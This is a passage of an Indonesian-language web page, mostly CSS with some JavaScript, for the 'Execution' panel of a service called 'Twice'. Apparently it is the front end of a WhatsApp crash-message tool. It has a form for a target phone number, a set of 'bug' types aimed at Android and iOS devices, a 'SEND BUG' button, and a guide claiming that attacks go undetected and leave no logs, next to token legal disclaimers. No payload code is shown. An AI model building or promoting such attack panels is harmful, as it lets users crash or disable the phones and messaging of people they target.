        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    
    .nav-menu{
      list-style:none;
      margin-top:25px;
    }
    
    .nav-item {
      margin-bottom: 8px;
    }
    
    .nav-link{
      display:flex;
      align-items:center;
      gap:12px;
      padding:14px 16px;
      color:var(--text);
      text-decoration:none;
      border-radius:12px;
      font-size:14px;
      transition:.3s;
      font-weight:500;
    }
    
    .nav-link:hover,
    .nav-link.active{
      background:linear-gradient(90deg,rgba(255,255,255,0.15),rgba(255,255,255,0.08));
      border-left:4px solid var(--secondary);
      transform:translateX(5px);
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    /* Main Content */
    .main-content{
      flex:1;
      padding: 20px 35px 35px;
      transition: margin-left 0.3s ease;
    }
    
    .header{
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin-bottom:20px;
      padding-bottom:20px;
      border-bottom:1px solid rgba(255,255,255,0.15);
    }
    
    .header-title{
      font-family:'Orbitron',sans-serif;
      font-size:28px;
      font-weight:800;
      color:#fff;
      text-shadow:0 0 20px rgba(255,255,255,0.3);
    }
    
    /* Form Section */
    .form-section {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 18px;
      padding: 28px;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }

    .form-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      border-radius: 18px 18px 0 0;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 22px;
      font-weight: 700;
      color: #fff;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 12px;
      text-shadow: 0 0 15px rgba(255,255,255,0.3);
    }

    .section-title i {
      color: var(--primary);
      font-size: 24px;
    }

    .label {
      color: #fff;
      font-size: 16px;
      margin-bottom: 10px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 8px;
      text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
    }

    .label i {
      color: var(--secondary);
    }

    .input-box {
      width: 100%;
      padding: 12px 15px;
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.2);
      color: white;
      border-radius: 12px;
      margin-bottom: 20px;
      outline: none;
      transition: all 0.3s;
      font-size: 15px;
    }

    .input-box:focus {
      border-color: var(--secondary);
      box-shadow: 0 0 15px var(--primary);
      transform: translateY(-2px);
    }

    /* PERBAIKAN: Ganti Select dengan Button System */
    .bug-selector-container {
      margin-bottom: 20px;
    }

    /* ----- Styling tombol trigger (pilih jenis bug) ----- */
    .bug-trigger-btn {
      width: 100%;
      padding: 14px 20px;
      background: linear-gradient(90deg, rgba(255,0,0,0.12), rgba(173,74,231,0.08));
      border: 1px solid rgba(255,255,255,0.12);
      color: white;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:12px;
      transition: transform .22s ease, box-shadow .22s ease, background .4s ease;
      position: relative;
      overflow: hidden;
      box-shadow: 0 6px 18px rgba(0,0,0,0.45);
    }

    /* animated chevron + subtle rotate on open */
    .bug-trigger-btn i {
      transition: transform .35s ease;
      opacity: .98;
      text-shadow: 0 0 8px rgba(255,255,255,0.06);
    }
    .bug-trigger-btn.active i {
      transform: rotate(180deg);
    }

    /* glow pulse when idle (very subtle so tidak mengganggu) */
    .bug-trigger-btn::after {
      content: "";
      position: absolute;
      inset: -30%;
      background: radial-gradient(circle at 10% 10%, rgba(255,0,0,0.03), transparent 15%),
                  radial-gradient(circle at 90% 90%, rgba(173,74,231,0.03), transparent 15%);
      z-index: 0;
      pointer-events: none;
      animation: slowDrift 6s linear infinite;
    }
    @keyframes slowDrift {
      0% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-6px) rotate(1deg); }
      100% { transform: translateY(0) rotate(0deg); }
    }
    .bug-trigger-btn > * { position: relative; z-index: 2; }

    /* ----- Container opsi (grid) ----- */
    .bug-options-container {
      display: none;
      margin-top: 10px;
      padding: 12px;
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.06);
      animation: fadeIn 0.28s ease;
    }
    .bug-options-container.active { 
      display: grid; 
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
    }

    /* ----- Tombol pilihan bug ----- */
    .bug-option-btn {
      padding: 14px 12px;
      border: none;
      border-radius: 10px;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: transform .2s ease, box-shadow .25s ease, filter .2s;
      background: linear-gradient(135deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      color: #fff;
      border: 1px solid rgba(255,255,255,0.04);
      box-shadow: 0 8px 20px rgba(0,0,0,0.45);
      min-height: 52px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* moving glossy sweep on hover */
    .bug-option-btn::before{
      content:"";
      position:absolute;
      top:0; left:-120%;
      width:120%;
      height:100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent);
      transform: skewX(-15deg);
      transition: left .6s cubic-bezier(.2,.9,.3,1);
      pointer-events:none;
    }
    .bug-option-btn:hover::before{ left:120%; }

    /* hover lift */
    .bug-option-btn:hover{
      transform: translateY(-6px);
      filter: brightness(1.04);
      box-shadow: 0 14px 30px rgba(0,0,0,0.55);
    }

    /* active/selected state */
    .bug-option-btn.selected{
      outline: 2px solid rgba(173,74,231,0.22);
      box-shadow: 0 18px 36px rgba(123,92,245,0.18), 0 6px 10px rgba(0,0,0,0.45);
      transform: translateY(-2px);
    }

    /* theme-aware colors using your variables */
    .bug-option-btn[data-mode^="andros"]{
      background: linear-gradient(135deg, rgba(255,0,0,0.06), rgba(173,74,231,0.06));
      color: #FFEFEF;
      border: 1px solid rgba(255,0,0,0.12);
    }
    .bug-option-btn[data-mode^="andros-delay"]{
      background: linear-gradient(135deg, rgba(0,81,255,0.06), rgba(173,74,231,0.06));
      color: #FFDADA;
      border: 1px solid rgba(173,74,231,0.12);
    }
    .bug-option-btn[data-mode="ios"]{
      background: linear-gradient(135deg, rgba(255,0,0,0.06), rgba(173,74,231,0.06));
      color: #FFEFEF;
      border: 1px solid rgba(255,0,0,0.12);
    }
    .bug-option-btn[data-mode="invis-iphone"]{
     background: linear-gradient(135deg, rgba(0,81,255,0.06), rgba(173,74,231,0.06));
      color: #FFDADA;
      border: 1px solid rgba(173,74,231,0.12);
    }
    
    .label-bug {
  background: linear-gradient(90deg, #ad4ae7, #ff005d);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  font-weight: 700;
  text-shadow: 0 0 10px rgba(173, 74, 231, 0.4),
               0 0 20px rgba(255, 0, 93, 0.3);
  letter-spacing: 0.5px;
  animation: labelPulse 2.8s ease-in-out infinite alternate;
}

@keyframes labelPulse {
  0% {
    text-shadow: 
      0 0 8px rgba(173,74,231,0.3),
      0 0 16px rgba(255,0,93,0.25);
    transform: scale(1);
  }
  50% {
    text-shadow: 
      0 0 16px rgba(173,74,231,0.6),
      0 0 30px rgba(255,0,93,0.4);
    transform: scale(1.02);
  }
  100% {
    text-shadow: 
      0 0 10px rgba(173,74,231,0.4),
      0 0 20px rgba(255,0,93,0.3);
    transform: scale(1);
  }
}

    /* small animated accent dot (left) */
    .bug-option-btn::after {
      content: "";
      position: absolute;
      left: 10px;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      box-shadow: 0 0 10px rgba(173,74,231,0.35);
      top: 50%;
      transform: translateY(-50%) scale(.95);
      opacity: .92;
      transition: transform .3s ease;
    }

    /* hide dot on very small screens to avoid crowd */
    @media (max-width:420px){
      .bug-option-btn::after{ display:none; }
    }

    /* ----- Terminal-style display dengan font coding ----- */
    .selected-bug-display {
      margin-top: 15px;
      padding: 12px 15px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 10px;
      border-left: 4px solid var(--pink);
      display: none;
      box-shadow: 0 6px 18px rgba(0,0,0,0.45);
      font-family: 'Source Code Pro', monospace;
      position: relative;
      overflow: hidden;
    }

    .selected-bug-display::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: 
        linear-gradient(transparent 95%, rgba(255, 0, 93, 0.1) 100%),
        repeating-linear-gradient(0deg, 
          transparent, 
          transparent 2px, 
          rgba(173, 74, 231, 0.05) 3px, 
          rgba(173, 74, 231, 0.05) 4px
        );
      pointer-events: none;
      z-index: 1;
    }

    .selected-bug-display.active {
      display: block;
      animation: terminalAppear 0.5s cubic-bezier(0.2, 0.9, 0.3, 1);
    }

    @keyframes terminalAppear {
      0% { 
        transform: translateY(-10px) scale(0.95); 
        opacity: 0;
        box-shadow: 0 0 0 rgba(255, 0, 93, 0);
      }
      70% { 
        transform: translateY(5px) scale(1.02); 
        opacity: 1;
      }
      100% { 
        transform: translateY(0) scale(1); 
        opacity: 1;
        box-shadow: 0 6px 18px rgba(0,0,0,0.45), 0 0 20px rgba(255, 0, 93, 0.2);
      }
    }

    .terminal-line {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
      font-family: 'Source Code Pro', monospace;
    }

    .terminal-prompt {
      color: var(--secondary);
      font-weight: 600;
      margin-right: 8px;
      font-size: 14px;
      text-shadow: 0 0 5px rgba(173, 74, 231, 0.5);
      font-family: 'Source Code Pro', monospace;
    }

    .terminal-text {
      color: var(--primary);
      font-size: 14px;
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid var(--primary);
      animation: blink 1s infinite;
      text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
      font-family: 'Source Code Pro', monospace;
      font-weight: 500;
    }

    /* Kursor hilang setelah selesai */
    .terminal-text.finished {
      border-right: none;
      animation: none;
    }

    @keyframes blink {
      0%, 50% { border-color: var(--muted); }
      51%, 100% { border-color: transparent; }
    }

    .bug-value {
      font-family: 'Source Code Pro', monospace;
      font-size: 16px;
      font-weight: 700;
      color: #fff;
      text-transform: uppercase;
      letter-spacing: 1.2px;
      text-shadow:
        0 0 10px rgba(255, 0, 93, 0.4),
        0 0 25px rgba(255, 0, 93, 0.25);
      margin-left: 5px;
    }

    /* Styling untuk teks READY berwarna hijau */
    .terminal-ready {
      color: var(--ready-green);
      font-size: 14px;
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid var(--ready-green);
      animation: blink 1s infinite;
      text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
      font-family: 'Source Code Pro', monospace;
      font-weight: 700;
    }

    .terminal-ready.finished {
      border-right: none;
      animation: none;
    }

    /* Terminal scanline effect dengan warna tema */
    .selected-bug-display::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 2px;
      background: linear-gradient(90deg, transparent, rgba(255, 0, 93, 0.6), transparent);
      z-index: 2;
    }

    /* accessibility focus for keyboard navigation */
    .bug-option-btn:focus, .bug-trigger-btn:focus{
      outline: 3px solid rgba(123,92,245,0.18);
      outline-offset: 2px;
    }

    /* tiny fadeIn used earlier */
    @keyframes fadeIn { from {opacity:0; transform:translateY(-6px)} to{opacity:1; transform:none} }

    /* Action Button */
    .action-btn-form {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 12px;
      color: white;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
      box-shadow: 0 5px 15px rgba(123, 92, 245, 0.4);
      letter-spacing: 0.5px;
    }

    .action-btn-form:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(123, 92, 245, 0.6);
    }

    .action-btn-form:active {
      transform: translateY(1px);
    }

    /* Info Section */
    .info-section {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 18px;
      padding: 28px;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }

    .info-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--secondary), var(--primary));
      border-radius: 18px 18px 0 0;
    }

    .info-content {
      line-height: 1.6;
    }

    .info-content h3 {
      color: #FF0000;
      margin-bottom: 15px;
      font-size: 18px;
      font-weight: 600;
    }

    .info-content p {
      margin-bottom: 15px;
      font-size: 14px;
      color: var(--text);
    }

    .info-content ul {
      margin-left: 20px;
      margin-bottom: 15px;
    }

    .info-content li {
      margin-bottom: 8px;
      font-size: 14px;
      color: var(--text);
    }

    .info-content .highlight {
      color: var(--primary);
      font-weight: 600;
    }

    .warning-box {
      background: rgba(255, 0, 0, 0.1);
      border-left: 4px solid var(--primary);
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
    }

    .warning-box p {
      margin: 0;
      color: #ff9999;
      font-size: 14px;
    }

    .note-box {
      background: rgba(173, 74, 231, 0.1);
      border-left: 4px solid #FFF900;
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
    }

    .note-box p {
      margin: 0;
      color: #F9F444;
      font-size: 14px;
    }
    
    /* Animations */
    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(20px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .form-section, .info-section {
      animation: fadeInUp 0.6s ease forwards;
    }

    /* Responsive */
    @media (min-width: 1024px) {
      .sidebar {
        transform: translateX(0);
      }
      .main-content {
        margin-left: 270px;
      }
      .menu-toggle {
        display: none;
      }
      .bottom-nav {
        display: none;
      }
    }
    
    @media (max-width: 1023px) {
      .main-content {
        margin-left: 0;
        padding: 15px 20px 80px;
      }
      .header-title {
        font-size: 24px;
      }
      .server-banner {
        min-height: 200px;
      }
      .banner-content {
        left: 15px;
        bottom: 10px;
      }
      .status-indicator {
        right: 15px;
        bottom: 10px;
      }
      
      .bug-options-container.active {
        grid-template-columns: 1fr;
      }
    }

    @media (max-width: 480px) {
      .form-section, .info-section {
        padding: 20px;
      }
    }
    
/* ==================== NOTIFICATION STYLES - UPDATED ==================== */
/* ==================== NOTIFICATION STYLES - PERFECT CHECKMARK ==================== */
.notification-container {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 10000;
    display: flex;
    justify-content: center;
    align-items: center;
    pointer-events: none;
}

.notification-overlay {
    background: rgba(0, 0, 0, 0.7);
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.3s ease;
    pointer-events: all;
}

.notification-card {
    background: linear-gradient(145deg, #2d3748, #1a202c);
    border-radius: 20px;
    padding: 40px 30px;
    max-width: 400px;
    width: 90%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    animation: slideUp 0.5s ease;
    position: relative;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideUp {
    from {
        transform: translateY(50px);
        opacity: 0;
    }
    to {
        transform: translateY(0);
        opacity: 1;
    }
}

@keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; }
}

/* Icon Container */
.notification-icon-container {
    width: 100px;
    height: 100px;
    margin: 0 auto 30px;
    position: relative;
}

.notification-circle {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    background: linear-gradient(135deg, #10b981, #059669);
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
    animation: scaleIn 0.5s ease 0.2s both;
}

@keyframes scaleIn {
    from { transform: scale(0); }
    to { transform: scale(1); }
}

/* Perfect Checkmark SVG */
.notification-checkmark {
    width: 50px;
    height: 50px;
}

.notification-checkmark-path {
    stroke: white;
    stroke-width: 6;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    stroke-dasharray: 100;
    stroke-dashoffset: 100;
    animation: drawCheckmark 0.8s ease 0.5s forwards;
}

@keyframes drawCheckmark {
    to {
        stroke-dashoffset: 0;
    }
}

/* Sparkles */
.notification-sparkles {
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
}

.notification-sparkle {
    position: absolute;
    width: 8px;
    height: 8px;
    background: #fbbf24;
    border-radius: 50%;
    animation: sparkle 1s ease-out forwards;
}

.notification-sparkle:nth-child(1) { top: 10%; left: 10%; animation-delay: 0.8s; }
.notification-sparkle:nth-child(2) { top: 10%; right: 10%; animation-delay: 0.85s; }
.notification-sparkle:nth-child(3) { bottom: 10%; left: 10%; animation-delay: 0.9s; }
.notification-sparkle:nth-child(4) { bottom: 10%; right: 10%; animation-delay: 0.95s; }

@keyframes sparkle {
    0% { transform: scale(0); opacity: 1; }
    50% { transform: scale(1.5); opacity: 0.8; }
    100% { transform: scale(0); opacity: 0; }
}

/* Text */
.notification-title {
    color: #10b981;
    font-size: 28px;
    margin-bottom: 15px;
    font-weight: 600;
    animation: fadeInText 0.5s ease 0.9s both;
}

.notification-message {
    color: #9ca3af;
    font-size: 16px;
    line-height: 1.6;
    margin-bottom: 30px;
    animation: fadeInText 0.5s ease 1s both;
}

@keyframes fadeInText {
    from {
        opacity: 0;
        transform: translateY(10px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

/* Button */
.notification-btn {
    background: linear-gradient(135deg, #10b981, #059669);
    color: white;
    border: none;
    padding: 14px 50px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
    animation: fadeInText 0.5s ease 1.1s both;
}

.notification-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
    background: linear-gradient(135deg, #059669, #047857);
}

.notification-btn:active {
    transform: translateY(0);
}

/* ==================== ERROR NOTIFICATION STYLES ==================== */
.notification-circle.error {
    background: linear-gradient(135deg, #ef4444, #dc2626);
    box-shadow: 0 10px 30px rgba(239, 68, 68, 0.4);
}

/* Error Cross (X) */
.notification-cross {
    width: 50px;
    height: 50px;
    position: relative;
}

.notification-cross-line1,
.notification-cross-line2 {
    position: absolute;
    background: white;
    border-radius: 3px;
    animation: drawCross 0.5s ease 0.5s both;
}

.notification-cross-line1 {
    width: 6px;
    height: 40px;
    left: 22px;
    top: 5px;
    transform: rotate(45deg);
    transform-origin: center;
}

.notification-cross-line2 {
    width: 6px;
    height: 40px;
    left: 22px;
    top: 5px;
    transform: rotate(-45deg);
    transform-origin: center;
}

@keyframes drawCross {
    from {
        height: 0;
    }
    to {
        height: 40px;
    }
}

/* Error Sparkles */
.notification-sparkle.error {
    background: #f59e0b; /* Warna kuning untuk error */
}

.notification-sparkle.error:nth-child(1) { top: 15%; left: 15%; animation-delay: 0.8s; }
.notification-sparkle.error:nth-child(2) { top: 15%; right: 15%; animation-delay: 0.85s; }
.notification-sparkle.error:nth-child(3) { bottom: 15%; left: 15%; animation-delay: 0.9s; }
.notification-sparkle.error:nth-child(4) { bottom: 15%; right: 15%; animation-delay: 0.95s; }

/* Text Error */
.notification-title.error {
    color: #ef4444;
}

/* Button Error */
.notification-btn.error {
    background: linear-gradient(135deg, #ef4444, #dc2626);
    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
}

.notification-btn.error:hover {
    box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
    background: linear-gradient(135deg, #dc2626, #b91c1c);
}
  </style>
</head>
<body>
  <!-- Menu Toggle Button -->
  <div class="menu-toggle" id="menuToggle">
    <i class="fas fa-bars"></i>
  </div>

  <!-- Sidebar Overlay -->
  <div class="sidebar-overlay" id="sidebarOverlay"></div>

  <!-- Sidebar -->
  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      <!-- Logo dengan efek Instagram Story -->
      <div class="logo-container">
        <div class="logo-ring"></div>
        <img src="https://files.catbox.moe/ygv8bt.mp4" class="logo" alt="DictiveCore Logo">
      </div>
      <div class="app-title">Twice</div>
      <div class="access-info"><b><i>Execution Mode</i></b></div>
    </div>
    
    <ul class="nav-menu">
      <li class="nav-item"><a href="/dashboard" class="nav-link"><i class="fas fa-tachometer-alt"></i>Dashboard</a></li>
      <li class="nav-item"><a href="/profile" class="nav-link"><i class="fas fa-user"></i>Profile</a></li>
      <li class="nav-item"><a href="https://te.me/sennmods1" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
      <li class="nav-item"><a href="https://wa.me/6282189275004" class="nav-link"><i class="fab fa-whatsapp"></i>WhatsApp</a></li>
      <li class="nav-item"><a href="/chat-ai" class="nav-link"><i class="fas fa-robot"></i>Chat AI</a></li>
      <li class="nav-item"><a href="/execution" class="nav-link active"><i class="fas fa-bolt"></i>Execution</a></li>
      <li class="nav-item"><a href="/qr-generator" class="nav-link"><i class="fas fa-qrcode"></i>QR Generator</a></li>
      <li class="nav-item"><a href="/tiktok" class="nav-link"><i class="fab fa-tiktok"></i>TikTok Downloader</a></li>
       <li class="nav-item"><a href="/quoteip" class="nav-link"><i class="fas fa-mobile-alt"></i>iPhone Quote</a></li>
      <li class="nav-item"><a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt"></i>Logout</a></li>
    </ul>
  </div>

  <!-- Main Content -->
  <div class="main-content">
    <!-- Server Status Banner - Full Width dengan Video -->
    <div class="server-banner">
      <video class="banner-video" autoplay muted loop playsinline>
        <source src="https://files.catbox.moe/ygv8bt.mp4" type="video/mp4">
        Your browser does not support the video tag.
      </video>
      <div class="banner-content">
        <div class="banner-title">Twice</div>
        <div class="banner-time">
          <i class="fas fa-clock"></i>
          <span id="currentTime">Loading...</span>
        </div>
      </div>
      <div class="status-indicator">
        <div class="status-dot"></div>
        <span>Online</span>
      </div>
    </div>

    <div class="header">
      <h1 class="header-title">Execution</h1>
    </div>

    <!-- Form Section -->
    <div class="form-section">
      <h2 class="section-title">
        <i class="fas fa-rocket"></i>
        Attack Panel
      </h2>
      <div class="label">
        <i class="fas fa-crosshairs"></i> Nomor Target
      </div>
      <input type="text" class="input-box" placeholder="Example: 62xxxxxxx">

      <div class="label">
        <i class="fas fa-bug"></i> Select Bug
      </div>
      
      <!-- PERBAIKAN: Ganti Select dengan Button System -->
      <div class="bug-selector-container">
        <button class="bug-trigger-btn" id="bugTriggerBtn">
          <span>Pilih Jenis Bug</span>
          <i class="fas fa-chevron-down"></i>
        </button>
        
        <div class="bug-options-container" id="bugOptionsContainer">
          <button class="bug-option-btn" data-mode="andros">BLANK UI</button>
          <button class="bug-option-btn" data-mode="andros-delay">DELAY INVIS</button>
          <button class="bug-option-btn" data-mode="ios">FORCE UI</button>
          <button class="bug-option-btn" data-mode="invis-iphone">BLANK IOS</button>
        </div>
        
        <!-- Terminal-style display dengan font coding dan READY -->
        <div class="selected-bug-display" id="selectedBugDisplay">
          <div class="terminal-line">
            <span class="terminal-prompt">user@Twice:~$</span>
            <span class="terminal-text" id="terminalCommand"></span>
          </div>
          <div class="terminal-line">
            <span class="terminal-prompt">></span>
            <span class="terminal-text" id="terminalOutput"></span>
          </div>
          <div class="terminal-line">
            <span class="terminal-prompt">>></span>
            <span class="bug-value" id="selectedBugText">-</span>
          </div>
          <div class="terminal-line">
            <span class="terminal-prompt">>>></span>
            <span class="terminal-ready" id="terminalReady"></span>
          </div>
        </div>
      </div>
      
      <button class="action-btn-form" id="launchAttackBtn">
        <i class="fas fa-rocket"></i> SEND BUG
      </button>
    </div>

    <!-- Information Section -->
    <div class="info-section">
      <h2 class="section-title">
        <i class="fas fa-info-circle"></i>
        Panduan Penggunaan
      </h2>
      <div class="info-content">
        <h3>𝘾𝙖𝙧𝙖 𝙈𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙋𝙖𝙣𝙚𝙡</h3>
        <p>Panel ini memungkinkan Anda untuk melakukan berbagai jenis serangan menggunakan bug yang tersedia. Berikut adalah panduan lengkapnya:</p>
        
        <ul>
          <li><span class="highlight">Nomor Target</span>: Masukkan nomor telepon target dengan format internasional (contoh: 6282189275004)</li>
          <li><span class="highlight">Pilih Bug</span>: Pilih jenis bug yang ingin digunakan sesuai dengan platform target</li>
          <li><span class="highlight">Launch Attack</span>: Klik tombol untuk memulai eksekusi serangan</li>
        </ul>
        
        <div class="warning-box">
          <p><i class="fas fa-exclamation-triangle"></i> <strong>Peringatan:</strong> Gunakan tools ini dengan bijak dan hanya untuk tujuan yang legal. Penyalahgunaan dapat mengakibatkan konsekuensi hukum.</p>
        </div>
        
        <h3>𝙅𝙚𝙣𝙞𝙨 𝘽𝙪𝙜 𝙔𝙖𝙣𝙜 𝙏𝙚𝙧𝙨𝙚𝙙𝙞𝙖</h3>
        <p>Kami menyediakan jenis bug yang dapat digunakan sesuai dengan platform target:</p>
        
        <ul>
          <li><span class="highlight">BUG ANDROID</span>: Efektif untuk perangkat Android dengan versi OS tertentu</li>
          <li><span class="highlight">BUG IOS</span>: Ditunjukan untuk perangkat Apple iPhone dengan iOS terbaru</li>
        </ul>
        
        <div class="note-box">
          <p><i class="fas fa-lightbulb"></i> <strong>Informasi tambahan:</strong> Tools ini ga perlu make sender cukup:</p>
          <p>➜ 𝗺𝗮𝘀𝘂𝗸𝗶𝗻 𝗻𝗼𝗺𝗼𝗿 𝘁𝗮𝗿𝗴𝗲𝘁</p>
          <p>➜ 𝗽𝗶𝗹𝗶𝗵 𝘁𝘆𝗽𝗲 𝗯𝘂𝗴</p>
          <p>➜ 𝗸𝗶𝗿𝗶𝗺</p>
        </div>
      </div>
    </div>

    <!-- Additional Info Section -->
    <div class="info-section">
      <h2 class="section-title">
        <i class="fas fa-shield-alt"></i>
        Keamanan & Privasi
      </h2>
      <div class="info-content">
        <h3>𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡 𝙆𝙚𝙖𝙢𝙖𝙣𝙖𝙣</h3>
        <p>Twice menggunakan protokol keamanan tingkat tinggi untuk melindungi identitas dan data pengguna:</p>
        
        <ul>
          <li><span class="highlight">Unidentified activity</span>: Semua aktivitas lu gak bakalan di curigai orng lain</li>
          <li><span class="highlight">Anonimitas</span>: Sistem tidak menyimpan log aktivitas pengguna (minim data & privasi aman)</li>
          <li><span class="highlight">Autentikasi Multi-Faktor</span>: Perlindungan tambahan untuk akun pengguna</li>
        </ul>
        
        <h3>𝙆𝙚𝙗𝙞𝙟𝙖𝙠𝙖𝙣 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙖𝙣</h3>
        <p>Dengan menggunakan platform ini, Anda menyetujui:</p>
        
        <ul>
          <li>Menggunakan tools hanya untuk tujuan yang sah dan etis</li>
          <li>Tidak menyalahgunakan untuk aktivitas ilegal</li>
          <li>Bertanggung jawab penuh atas semua tindakan yang lu lakukin</li>
          <li>Memahami risiko dan konsekuensi dari penggunaan tools</li>
        </ul>
        
        <div class="warning-box">
          <p><i class="fas fa-exclamation-triangle"></i> <strong>Penting:</strong> gw gak bertanggung jawab atas penyalahgunaan tools ini ya!. Semua aktivitas yang lu lakuin sepenuhnya menjadi tanggung jawab pengguna.</p>
        </div>
      </div>
    </div>
  </div>
  <!-- Notification Container -->
<div class="notification-container" id="notificationContainer"></div>
  <script>
    // Menu toggle functionality
const menuToggle = document.getElementById('menuToggle');
const sidebar = document.getElementById('sidebar');
const sidebarOverlay = document.getElementById('sidebarOverlay');

function toggleSidebar() {
    sidebar.classList.toggle('active');
    sidebarOverlay.classList.toggle('active');
}

menuToggle.addEventListener('click', toggleSidebar);
sidebarOverlay.addEventListener('click', toggleSidebar);

// Update current time
function updateCurrentTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    document.getElementById('currentTime').textContent = timeString;
}

// Notification System - SUCCESS
function showSuccessNotification(title = "SUCCESS SEND", message = "Attack launched successfully!") {
    const notificationContainer = document.getElementById('notificationContainer');
    
    // Clear any existing notifications
    notificationContainer.innerHTML = '';
    
    const notification = document.createElement('div');
    notification.className = 'notification-overlay';
    notification.innerHTML = 
        '<div class="notification-card">' +
            '<div class="notification-icon-container">' +
                '<div class="notification-sparkles">' +
                    '<div class="notification-sparkle"></div>' +
                    '<div class="notification-sparkle"></div>' +
                    '<div class="notification-sparkle"></div>' +
                    '<div class="notification-sparkle"></div>' +
                '</div>' +
                '<div class="notification-circle">' +
                    '<svg class="notification-checkmark" viewBox="0 0 52 52">' +
                        '<path class="notification-checkmark-path" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>' +
                    '</svg>' +
                '</div>' +
            '</div>' +
            '<h2 class="notification-title">' + title + '</h2>' +
            '<p class="notification-message">' + message + '</p>' +
            '<button class="notification-btn" onclick="closeNotification()">OK</button>' +
        '</div>';
    
    notificationContainer.appendChild(notification);
    
    // Auto close after 5 seconds
    setTimeout(() => {
        closeNotification();
    }, 5000);
}

// Notification System - ERROR
function showErrorNotification(title = "ERROR", message = "Something went wrong!") {
    const notificationContainer = document.getElementById('notificationContainer');
    
    // Clear any existing notifications
    notificationContainer.innerHTML = '';
    
    const notification = document.createElement('div');
    notification.className = 'notification-overlay';
    notification.innerHTML = 
        '<div class="notification-card">' +
            '<div class="notification-icon-container">' +
                '<div class="notification-sparkles">' +
                    '<div class="notification-sparkle error"></div>' +
                    '<div class="notification-sparkle error"></div>' +
                    '<div class="notification-sparkle error"></div>' +
                    '<div class="notification-sparkle error"></div>' +
                '</div>' +
                '<div class="notification-circle error">' +
                    '<div class="notification-cross">' +
                        '<div class="notification-cross-line1"></div>' +
